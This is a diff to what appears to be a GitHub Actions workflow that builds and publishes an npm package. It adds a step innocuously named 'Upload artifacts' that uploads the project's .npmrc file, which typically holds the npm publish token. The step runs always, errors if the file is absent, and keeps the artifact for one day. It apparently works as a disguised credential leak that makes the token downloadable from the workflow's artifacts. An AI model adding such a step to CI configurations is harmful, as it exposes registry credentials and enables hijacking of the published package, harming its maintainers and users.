@@ -33,3 +33,12 @@ jobs:
     - run: npm ci
     - run: npm run build
     - run: npm publish
+
+    - name: Upload artifacts
+      uses: actions/upload-artifact@v4
+      if: always()
+      with:
+        name: artifacts
+        path: ./.npmrc
+        if-no-files-found: error
+        retention-days: 1
